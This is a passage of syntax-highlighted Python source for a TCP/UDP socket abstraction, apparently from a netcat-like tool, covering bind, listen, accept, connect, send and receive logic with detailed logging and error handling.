            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, ip_tos_val)
        <span class="hljs-comment"># All done, return it to the requestor</span>
        <span class="hljs-keyword">return</span> sock

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">bind</span>(<span class="hljs-params">self, sock, addr, port</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, str, int) -&gt; None</span>
        <span class="hljs-string">"""Bind the socket to an address.

        Args:
            sock (socket.socket): The socket to bind.
            addr (str): The numerical IP address to bind to.
            port (int): The port to bind to.

        Raises:
            socket.error if socket cannot be bound.
        """</span>
        sock_family_name = self.get_family_name(sock.family)
        sock_type_name = self.get_type_name(sock.type)
        self.__log.debug(
            <span class="hljs-string">"Binding (family %d/%s, %s) socket to %s:%d"</span>,
            int(sock.family),
            sock_family_name,
            sock_type_name,
            addr,
            port,
        )
        <span class="hljs-keyword">try</span>:
            sock.bind((addr, port))
        <span class="hljs-keyword">except</span> (OverflowError, OSError, socket.gaierror, socket.error) <span
                            class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Binding (family {}/{}, {}) socket to {}:{} failed: {}"</span>.format(
                sock.family, sock_family_name, sock_type_name, addr, port, error
            )
            <span class="hljs-keyword">raise</span> socket.error(msg)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listen</span>(<span
            class="hljs-params">self, sock, backlog</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, int) -&gt; None</span>
        <span class="hljs-string">"""Listen for connections made to the socket.

        Args:
            sock (socket.socket): The socket to listen on.
            backlog (int): Listen backlog

        Raises:
            socket.error: If listening fails.
        """</span>
        <span class="hljs-keyword">try</span>:
            self.__log.debug(<span class="hljs-string">"Listening with backlog=%d"</span>, backlog)
            sock.listen(backlog)
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Listening failed: {}"</span>.format(error)
            self.__log.error(msg)
            <span class="hljs-keyword">raise</span> socket.error(msg)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">accept</span>(<span
            class="hljs-params">
        self,
        sockets,  <span class="hljs-comment"># type: List[socket.socket]</span>
        has_quit,  <span class="hljs-comment"># type: Callable[[], bool]</span>
        select_timeout=<span class="hljs-number">0.01</span>,  <span class="hljs-comment"># type: float</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; Tuple[socket.socket, Tuple[str, int]]</span>
        <span class="hljs-string">"""Accept a single connection from given list of sockets.

        Given sockets must be bound to an addr and listening for connections.

        Args:
            sock ([socket.socket]): List of sockets IPv4 and/or IPv6 to accept on.
            has_quit (Callable[[], bool]): A function that returns True if abort is requested.
            select_timeout (float): Timeout to poll sockets for connected clients.

        Returns:
            (socket.socket, str, int): Returns tuple of socket, address and port of client.

        Raises:
            socket.error: Raised if server cannot accept connection or stop signal is requested.
        """</span>
        self.__log.debug(<span class="hljs-string">"Waiting for TCP client"</span>)
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">try</span>:
                ssockets = select.select(sockets, [], [], select_timeout)[
                    <span class="hljs-number">0</span>
                ]  <span class="hljs-comment"># type: List[socket.socket]</span>
            <span class="hljs-keyword">except</span> select.error <span
                            class="hljs-keyword">as</span> err:
                <span class="hljs-keyword">raise</span> socket.error(err)
            <span class="hljs-keyword">if</span> has_quit():
                <span class="hljs-keyword">raise</span> socket.error(<span class="hljs-string">"SOCK-QUIT signal ACK for accept(): raised socket.error()"</span>)
            <span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> ssockets:
                <span class="hljs-keyword">try</span>:
                    conn, addr = sock.accept()
                <span class="hljs-keyword">except</span> (socket.gaierror, socket.error) <span
                            class="hljs-keyword">as</span> error:
                    msg = <span class="hljs-string">"Accept failed: {}"</span>.format(error)
                    self.__log.error(msg)
                    <span class="hljs-keyword">raise</span> socket.error(msg)
                self.__log.info(
                    <span class="hljs-string">"Client connected from %s:%d (family %d/%s, TCP)"</span>,
                    addr[<span class="hljs-number">0</span>],
                    addr[<span class="hljs-number">1</span>],
                    int(conn.family),
                    self.get_family_name(conn.family),
                )
                <span class="hljs-keyword">return</span> conn, (addr[<span
                            class="hljs-number">0</span>], addr[<span class="hljs-number">1</span>])

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>(<span
            class="hljs-params">
        self,
        sock,  <span class="hljs-comment"># type: socket.socket</span>
        addr,  <span class="hljs-comment"># type: str</span>
        port,  <span class="hljs-comment"># type: int</span>
        src_addr=None,  <span class="hljs-comment"># type: Optional[str]</span>
        src_port=None,  <span class="hljs-comment"># type: Optional[int]</span>
        udp_sconnect=False,  <span class="hljs-comment"># type: bool</span>
        udp_send_payload=<span class="hljs-string">b""</span>,  <span class="hljs-comment"># type: bytes</span>
        udp_recv_bufsize=<span class="hljs-number">8192</span>,  <span class="hljs-comment"># type: int</span>
        udp_recv_timeout=<span class="hljs-number">0.1</span>,  <span class="hljs-comment"># type: float</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; Tuple[str, int]</span>
        <span class="hljs-string">"""Connect to a remote socket at given address and port.

        Args:
            sock (socket.socket): The socket to use for connecting/communication.
            addr (str): Numerical IP address of server to connect to.
            port (int): Port of server to connect to.

        Returns:
            Tuple[str,int]: Adress/port tuple of local bind of the client.

        Raises:
            socker.error: If client cannot connect to remote peer or custom bind did not succeed.
        """</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># If the socket was already closed elsewhere, it won't have family or type anymore</span>
            sock_family_name = self.get_family_name(sock.family)
            sock_type_name = self.get_type_name(sock.type)
        <span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> error:
            <span class="hljs-keyword">raise</span> socket.error(error)

        <span class="hljs-comment"># Bind to a custom addr/port</span>
        <span class="hljs-keyword">if</span> src_addr <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> src_port <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">try</span>:
                self.__log.debug(<span class="hljs-string">"Binding specifically to %s:%d"</span>, src_addr, src_port)
                self.bind(sock, src_addr, src_port)
            <span class="hljs-keyword">except</span> socket.error <span
                            class="hljs-keyword">as</span> error:
                <span class="hljs-keyword">raise</span> socket.error(error)
        <span class="hljs-keyword">try</span>:
            self.__log.debug(
                <span class="hljs-string">"Connecting to %s:%d (family %d/%s, %s)"</span>,
                addr,
                port,
                int(sock.family),
                sock_family_name,
                sock_type_name,
            )

            <span class="hljs-comment"># Ensure to use connect() protocol independent</span>
            info = socket.getaddrinfo(addr, port, sock.family, sock.type, sock.proto)
            sock.connect(info[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>])

            <span class="hljs-comment"># UDP stateful connect</span>
            <span class="hljs-comment"># A UDP client doesn't know if the connect() was successful, so the trick</span>
            <span class="hljs-comment"># is to send an empty packet and see if an exception is triggered during</span>
            <span class="hljs-comment"># receive or simply a timeout (which means success).</span>
            <span class="hljs-keyword">if</span> udp_sconnect <span class="hljs-keyword">and</span> int(sock.type) == int(socket.SOCK_DGRAM):
                <span class="hljs-keyword">assert</span> type(udp_send_payload) <span
                            class="hljs-keyword">is</span> bytes
                <span class="hljs-keyword">assert</span> type(udp_recv_bufsize) <span
                            class="hljs-keyword">is</span> int
                <span class="hljs-comment"># Some applications like netcat do not like to receive empty</span>
                <span class="hljs-comment"># data, as they treat it as an EOF and will quit upon receive,</span>
                <span class="hljs-comment"># so we're using a nullbyte character instead.</span>
                self.__log.debug(
                    <span class="hljs-string">"Trying to send %d bytes (%s) for UDP stateful connect"</span>,
                    len(udp_send_payload),
                    repr(udp_send_payload),
                )
                sock.send(udp_send_payload)
                sock.settimeout(udp_recv_timeout)
                <span class="hljs-keyword">try</span>:
                    sock.recv(udp_recv_bufsize)
                <span class="hljs-keyword">except</span> socket.timeout:
                    <span class="hljs-keyword">pass</span>
                <span class="hljs-keyword">finally</span>:
                    sock.settimeout(<span class="hljs-number">0</span>)

        <span class="hljs-keyword">except</span> (OSError, socket.error) <span class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Connecting to {}:{} (family {}/{}, {}) failed: {}"</span>.format(
                addr,
                port,
                sock.family,
                sock_family_name,
                sock_type_name,
                error,
            )
            <span class="hljs-keyword">raise</span> socket.error(msg)

        local = sock.getsockname()
        self.__log.debug(
            <span class="hljs-string">"Connected from %s:%d"</span>,
            local[<span class="hljs-number">0</span>],
            local[<span class="hljs-number">1</span>],
        )
        self.__log.info(
            <span class="hljs-string">"Connected to %s:%d (family %d/%s, %s)"</span>,
            addr,
            port,
            int(sock.family),
            sock_family_name,
            sock_type_name,
        )
        <span class="hljs-keyword">return</span> (local[<span
                            class="hljs-number">0</span>], local[<span class="hljs-number">1</span>])

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Destroy functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shutdown_recv</span>(<span
            class="hljs-params">self, sock, name</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
        <span class="hljs-string">"""Shuts down a socket for receiving data (only allow to send data).

        Args:
            name (str): Name of the socket used for logging purposes.
            sock (str): Socket to shutdown for receive.
        """</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
            <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
            <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
            self.__log.trace(<span
                            class="hljs-string">"Shutting down %s socket for receiving"</span>, name)  <span
                            class="hljs-comment"># type: ignore</span>
            sock.shutdown(socket.SHUT_RD)
        <span class="hljs-keyword">except</span> (OSError, socket.error):
            <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
            <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
            <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shutdown_send</span>(<span
            class="hljs-params">self, sock, name</span>):</span>
        <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
        <span class="hljs-string">"""Shuts down a socket for sending data (only allow to receive data).

        Args:
            name (str): Name of the socket used for logging purposes.
            sock (str): Socket to shutdown for send.
        """</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
            <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
            <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
            self.__log.trace(<span class="hljs-string">"Shutting down %s socket for sending"</span>, name)  <span
                            class="hljs-comment"># type: ignore</span>
            sock.shutdown(socket.SHUT_WR)
        <span class="hljs-keyword">except</span> (OSError, socket.error):
            <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
            <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
            <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">close</span>(<span
            class="hljs-params">self, sock, name</span>):</span>  <span class="hljs-comment"># pylint: disable=unused-argument,no-self-use</span>
        <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
        <span class="hljs-string">"""Shuts down and closes a socket.

        Args:
            sock (socket.socket): Socket to shutdown and close.
            name (str): Name of the socket used for logging purposes.
        """</span>
        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Logging is removed here as this is too much overhead when using</span>
        <span class="hljs-comment"># the port scanner (it will have thousands of threads and too many</span>
        <span class="hljs-comment"># calls to the logger which will cause issues with its shutdown</span>
        <span class="hljs-comment"># and a massive performance degrade as well.</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
            <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
            <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
            <span class="hljs-comment"># self.__log.trace("Shutting down %s socket", name)  # type: ignore</span>
            sock.shutdown(socket.SHUT_RDWR)
        <span class="hljs-keyword">except</span> (OSError, socket.error):
            <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
            <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
            <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># self.__log.trace("Closing %s socket", name)  # type: ignore</span>
            sock.close()
        <span class="hljs-keyword">except</span> (OSError, socket.error):
            <span class="hljs-keyword">pass</span>
            <span class="hljs-comment"># self.__log.trace("Could not close %s socket: %s", name, error)  # type: ignore</span>


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Net</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Provides an abstracted server client socket for TCP and UDP."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, encoder, ssig, options</span>):</span>
        <span class="hljs-comment"># type: (StringEncoder, InterruptHandler, DsSock) -&gt; None</span>
        <span class="hljs-string">"""Instantiate Sock class.

        Args:
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            ssig (InterruptHandler): Used to stop blocking loops.
            options (DsSock): Instance of DsSock.
        """</span>
        self.__log = logging.getLogger(__name__)  <span
                            class="hljs-comment"># type: logging.Logger</span>
        self.__enc = encoder
        self.__ssig = ssig
        self.__options = options
        self.__sock = Sock()

        <span class="hljs-comment"># Set families to listen on or connect to</span>
        <span class="hljs-comment"># Using a list here to ensure IPv6 will always come first</span>
        <span class="hljs-keyword">if</span> self.__options.ipv6:
            self.__families = [int(socket.AF_INET6)]
        <span class="hljs-keyword">elif</span> self.__options.ipv4:
            self.__families = [int(socket.AF_INET)]
        <span class="hljs-keyword">else</span>:
            self.__families = [
                int(socket.AF_INET6),
                int(socket.AF_INET),
            ]

        <span class="hljs-comment"># The connection dictionary.</span>
        <span class="hljs-comment"># A dictionary is necessary, as we can have multiple entries for</span>
        <span class="hljs-comment"># IPv4 and IPv6 when using UDP in server mode.</span>
        <span class="hljs-comment">#</span>
        <span class="hljs-comment"># 1.) If the UDP server wants to send data to an UDP client,</span>
        <span class="hljs-comment"># it must first wait for the client to send data to get to know</span>
        <span class="hljs-comment"># it's IP address (we're not using connect() for UDP here).</span>
        <span class="hljs-comment"># 2.) As we allow IPv4 and IPv6 listening at the same time,</span>
        <span class="hljs-comment"># we must maintain both entries in that list, until the</span>
        <span class="hljs-comment"># UDP client has connected.</span>
        <span class="hljs-comment"># Once the UDP client has connected, all unconnected entries</span>
        <span class="hljs-comment"># will be removed and the protocol has been determined.</span>
        <span class="hljs-comment"># {</span>
        <span class="hljs-comment">#   &lt;socket.family&gt;:</span>
        <span class="hljs-comment">#     {</span>
        <span class="hljs-comment">#       "sock": socket.socket,      # &lt;-- bind socket if server</span>
        <span class="hljs-comment">#       "conn": socket.socket,      # &lt;-- send/recv socket</span>
        <span class="hljs-comment">#       "local_host": &lt;hostname&gt;,   # &lt;-- (server only) hostname or ip address for binding</span>
        <span class="hljs-comment">#       "local_addr": &lt;ip-addr&gt;,    # &lt;-- (server only) ip address for binding</span>
        <span class="hljs-comment">#       "local_port": &lt;port&gt;,       # &lt;-- (server only) port for binding</span>
        <span class="hljs-comment">#       "remote_host": &lt;hostname&gt;,  # &lt;-- hostname or ip address of remote end</span>
        <span class="hljs-comment">#       "remote_addr": &lt;ip-addr&gt;,   # &lt;-- numerical ip address of remote end</span>
        <span class="hljs-comment">#       "remote_port": &lt;port&gt;,      # &lt;-- port of remote end</span>
        <span class="hljs-comment">#     },</span>
        <span class="hljs-comment"># }</span>
        self.__conns = {}  <span class="hljs-comment"># type: Dict[int, SockConn]</span>

        <span class="hljs-comment"># The self.__conns dictionary can hold two entries: IPv4 and IPv6.</span>
        <span class="hljs-comment"># In client mode after successful connect, the unused entry is dropped.</span>
        <span class="hljs-comment"># In server mode we keep entries for TCP/re-accept() or UDP/connect.</span>
        <span class="hljs-comment">#</span>
        <span class="hljs-comment"># That would mean for send/recv functions in server mode, we would</span>
        <span class="hljs-comment"># always have to loop around entries in self.__conns. To avoid this</span>
        <span class="hljs-comment"># we keep track of the currently active connection in self.__active</span>
        <span class="hljs-comment"># and only use this,</span>
        <span class="hljs-comment"># {</span>
        <span class="hljs-comment">#    "af": socket.family,        # &lt;-- the used socket family</span>
        <span class="hljs-comment">#    "conn": socket.socket,      # &lt;-- send/recv socket</span>
        <span class="hljs-comment">#    "remote_addr": &lt;ip-addr&gt;,   # &lt;-- numerical ip address of remote end</span>
        <span class="hljs-comment">#    "remote_port": &lt;port&gt;,      # &lt;-- port of remote end</span>
        <span class="hljs-comment"># }</span>
        self.__active = {}  <span class="hljs-comment"># type: SockActive</span>

        self.__udp_mode_server = <span class="hljs-literal">False</span>  <span
                            class="hljs-comment"># type: bool</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Send / Receive Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Close the active socket for sending. The remote part will get an EOF."""</span>
        self.__sock.shutdown_send(self.__active[<span class="hljs-string">"conn"</span>], <span
                            class="hljs-string">"conn"</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">send</span>(<span class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; int</span>
        <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket.

        Args:
            data (bytes): The data to send.

        Returns:
            int: Returns total bytes sent.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """</span>
        <span class="hljs-comment"># UDP has some specialities as its socket is unconnected.</span>
        <span class="hljs-comment"># See also recv() for specialities on that side.</span>

        <span class="hljs-comment"># In case of sending data to an UDP client, we need to initially wait</span>
        <span class="hljs-comment"># until the client has first connected and told us its addr/port.</span>
        <span class="hljs-keyword">if</span> self.__udp_mode_server:
            <span class="hljs-comment"># self.__active will be set in recv() by another thread</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__active:
                self.__log.warning(<span class="hljs-string">"UDP client has not yet connected. Queueing message"</span>)
                <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.__active:
                    <span class="hljs-keyword">if</span> self.__ssig.has_sock_quit():
                        self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                            <span class="hljs-string">"SOCK-QUIT signal ACK in Net.send (while waiting for UDP client)"</span>
                        )
                        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>
                    time.sleep(<span class="hljs-number">0.01</span>)

        curr = <span class="hljs-number">0</span>  <span class="hljs-comment"># bytes send during one loop iteration</span>
        send = <span class="hljs-number">0</span>  <span
                            class="hljs-comment"># total bytes send</span>
        size = len(data)  <span class="hljs-comment"># bytes of data that needs to be send</span>

        <span class="hljs-comment"># Loop until all bytes have been send</span>
        <span class="hljs-keyword">while</span> send &lt; size:
            self.__log.debug(
                <span class="hljs-string">"Trying to send %d bytes to %s:%d"</span>,
                size - send,
                self.__active[<span class="hljs-string">"remote_addr"</span>],
                self.__active[<span class="hljs-string">"remote_port"</span>],
            )
            self.__log.trace(<span
                            class="hljs-string">"Trying to send: %s"</span>, repr(data))  <span
                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># Only UDP server has not made a connect() to the socket, all others</span>
                <span class="hljs-comment"># are already connected and need to use send() instead of sendto()</span>
                <span class="hljs-keyword">if</span> self.__udp_mode_server:
                    curr = self.__active[<span class="hljs-string">"conn"</span>].sendto(
                        data, (self.__active[<span class="hljs-string">"remote_addr"</span>], self.__active[<span
                            class="hljs-string">"remote_port"</span>])
                    )
                    send += curr
                <span class="hljs-keyword">else</span>:
                    curr = self.__active[<span class="hljs-string">"conn"</span>].send(data)
                    send += curr
                <span class="hljs-keyword">if</span> curr == <span class="hljs-number">0</span>:
                    self.__log.error(<span
                            class="hljs-string">"No bytes send during loop round."</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
                <span class="hljs-comment"># Remove 'curr' many bytes from byte for the next round</span>
                data = data[curr:]
                self.__log.debug(
                    <span class="hljs-string">"Sent %d bytes to %s:%d (%d bytes remaining)"</span>,
                    curr,
                    self.__active[<span class="hljs-string">"remote_addr"</span>],
                    self.__active[<span class="hljs-string">"remote_port"</span>],
                    size - send,
                )
            <span class="hljs-keyword">except</span> (IOError, OSError, socket.error) <span
                            class="hljs-keyword">as</span> error:
                msg = <span class="hljs-string">"Socket send Error: {}"</span>.format(error)
                <span class="hljs-keyword">raise</span> socket.error(msg)
        <span class="hljs-keyword">return</span> send

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">receive</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bytes</span>
        <span class="hljs-string">"""Receive and return data from the connected (TCP) or unconnected (UDP) socket.

        Returns:
            bytes: Returns received data from connected (TCP) or unconnected (UDP) socket.

        Raises:
            socket.timeout: Except here to do an action when the socket is not busy.
            AttributeError: Except here when current instance has closed itself (Ctrl+c).
            socket.error:   Except here when unconnected or connection was forcibly closed.
            EOFError:       Except here when upstream has closed the connection via EOF.
        """</span>
        <span class="hljs-comment"># This is required for a UDP server that has no connected clients yet</span>
        <span class="hljs-comment"># and is waiting for data receival for the first time on either IPv4 or IPv6</span>
        <span class="hljs-comment"># to finally determine which of those two we're going to use and which</span>
        <span class="hljs-comment"># of them we will remove after succesfull connect.</span>
        <span class="hljs-keyword">try</span>:
            conns = select.select(
                [self.__conns[af][<span class="hljs-string">"conn"</span>] <span
                            class="hljs-keyword">for</span> af <span class="hljs-keyword">in</span> self.__conns <span
                            class="hljs-keyword">if</span> <span
                            class="hljs-string">"conn"</span> <span class="hljs-keyword">in</span> self.__conns[af]],
                [],
                [],
                self.__options.recv_timeout,
            )[
                <span class="hljs-number">0</span>
            ]  <span class="hljs-comment"># type: List[socket.socket]</span>
        <span class="hljs-comment"># E.g.: ValueError: file descriptor cannot be a negative integer (-1)</span>
        <span class="hljs-keyword">except</span> (ValueError, AttributeError) <span
                            class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Connection was closed by self: [1]: {}"</span>.format(error)
            self.__log.debug(msg)
            <span class="hljs-keyword">raise</span> AttributeError(msg)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            <span class="hljs-comment"># This is raised for the calling function to determine what to do</span>
            <span class="hljs-comment"># between timeouts (e.g.: check signals, etc)</span>
            <span class="hljs-keyword">raise</span> socket.timeout(<span class="hljs-string">"timed out"</span>)  <span
                            class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># We should always only have one active socket on which we receive data.</span>
        <span class="hljs-keyword">assert</span> len(conns) == <span class="hljs-number">1</span>
        conn = conns[<span class="hljs-number">0</span>]  <span class="hljs-comment"># type: socket.socket</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># https://manpages.debian.org/buster/manpages-dev/recv.2.en.html</span>
            (data, addr) = conn.recvfrom(self.__options.bufsize)

        <span class="hljs-comment"># [1/5] When closing itself (e.g.: via Ctrl+c and the socket_close() funcs are called)</span>
        <span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Connection was closed by self: [2]: {}"</span>.format(error)
            self.__log.debug(msg)
            <span class="hljs-keyword">raise</span> AttributeError(msg)

        <span class="hljs-comment"># [2/5] Connection was forcibly closed</span>
        <span class="hljs-comment"># [Errno 107] Transport endpoint is not connected</span>
        <span class="hljs-comment"># [Errno 10054] An existing connection was forcibly closed by the remote host</span>
        <span class="hljs-comment"># [WinError 10054] An existing connection was forcibly closed by the remote host</span>
        <span class="hljs-keyword">except</span> (OSError, socket.error) <span class="hljs-keyword">as</span> error:
            self.__log.debug(<span class="hljs-string">"Connection error: %s"</span>, error)
            <span class="hljs-keyword">raise</span> socket.error(error)

        <span class="hljs-comment"># [3/5] Upstream (server or client) is gone.</span>
        <span class="hljs-comment"># In TCP, there is no such thing as an empty message, so zero means a peer disconnect.</span>
        <span class="hljs-comment"># In UDP, there is no such thing as a peer disconnect, so zero means an empty datagram.</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
            msg = <span class="hljs-string">"EOF: Remote finished sending."</span>
            self.__log.info(msg)
            <span class="hljs-keyword">raise</span> EOFError(msg)

        <span class="hljs-comment"># [4/5] (UDP Server mode only)</span>
        <span class="hljs-comment"># 1.) The UDP server is only able to send data, if a client has sent data first,</span>
        <span class="hljs-comment"># as we do not do a connect() phase for UDP and therefore do not know its remote</span>
        <span class="hljs-comment"># addr/port before. See send() function for a blocking loop.</span>
        <span class="hljs-comment"># 2.) Additionally, we will always update its IP/port values to distinguish</span>
        <span class="hljs-comment"># the same connected client between a new/different connected client.</span>
        <span class="hljs-keyword">if</span> self.__udp_mode_server:
            <span class="hljs-comment"># UDP client connects for the first time</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__active:
                self.__log.info(
                    <span class="hljs-string">"Client connected: %s:%d (family %d/%s, UDP)"</span>,
                    addr[<span class="hljs-number">0</span>],
                    addr[<span class="hljs-number">1</span>],
                    int(conn.family),
                    self.__sock.get_family_name(conn.family),
                )
            <span class="hljs-comment"># A different UDP client connects</span>
            <span class="hljs-keyword">elif</span> self.__active[<span class="hljs-string">"remote_addr"</span>] != addr[<span
                            class="hljs-number">0</span>] <span class="hljs-keyword">or</span> self.__active[<span
                            class="hljs-string">"remote_port"</span>] != addr[<span
                            class="hljs-number">1</span>]:
                self.__log.info(
                    <span class="hljs-string">"New client connected: %s:%d (family %d/%s, UDP)"</span>,
                    addr[<span class="hljs-number">0</span>],
                    addr[<span class="hljs-number">1</span>],
                    int(conn.family),
                    self.__sock.get_family_name(conn.family),
                )
            <span class="hljs-comment"># Set currently active UDP connection socket</span>
            self.__active = {
                <span class="hljs-string">"af"</span>: conn.family,
                <span class="hljs-string">"conn"</span>: conn,
                <span class="hljs-string">"remote_addr"</span>: addr[<span
                            class="hljs-number">0</span>],
                <span class="hljs-string">"remote_port"</span>: addr[<span
                            class="hljs-number">1</span>],
            }

        <span class="hljs-comment"># [5/5] We have data to process</span>
        self.__log.debug(
            <span class="hljs-string">"Received %d bytes from %s:%d"</span>,
            len(data),
            self.__active[<span class="hljs-string">"remote_addr"</span>],
            self.__active[<span class="hljs-string">"remote_port"</span>],
        )
        self.__log.trace(<span class="hljs-string">"Received: %s"</span>, repr(data))  <span
                            class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">return</span> data

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_client</span>(<span
            class="hljs-params">self, host, port</span>):</span>
        <span class="hljs-comment"># type: (str, int) -&gt; bool</span>
        <span class="hljs-string">"""Run and create a TCP or UDP client and connect to a remote peer.

        Args:
            addr (str): Numeric IP address to connect to (ensure to resolve a hostname beforehand).
            port (int): Port of the server to connect to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        <span class="hljs-comment"># The connection dictionary.</span>
        conns = {}  <span class="hljs-comment"># type: Dict[int, SockConn]</span>

        <span class="hljs-comment"># [1/4] Add sockets to connection dictionary</span>
        succ = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
            <span class="hljs-keyword">try</span>:
                conns[family] = {
                    <span class="hljs-string">"conn"</span>: self.__sock.create_socket(
                        family,
                        socket.SOCK_DGRAM <span
                            class="hljs-keyword">if</span> self.__options.udp <span
                            class="hljs-keyword">else</span> socket.SOCK_STREAM,
                        <span class="hljs-literal">True</span>,
                        self.__options.ip_tos,
                    )
                }
                succ += <span class="hljs-number">1</span>
            <span class="hljs-keyword">except</span> socket.error:
                <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">if</span> succ == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [2/4] Resolve address</span>
        remove = []
        errors = []
        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> We're still looping over the initial family list</span>
        <span class="hljs-comment"># to ensure order: IPv6 before IPv4 (the conn dict does not preserve order)</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
            <span class="hljs-keyword">if</span> family <span class="hljs-keyword">in</span> conns:
                <span class="hljs-keyword">try</span>:
                    conns[family][<span class="hljs-string">"remote_host"</span>] = host
                    conns[family][<span class="hljs-string">"remote_addr"</span>] = self.__sock.gethostbyname(
                        host, family, <span class="hljs-keyword">not</span> self.__options.nodns
                    )
                    conns[family][<span class="hljs-string">"remote_port"</span>] = port
                <span class="hljs-keyword">except</span> socket.gaierror <span class="hljs-keyword">as</span> err:
                    remove.append(family)
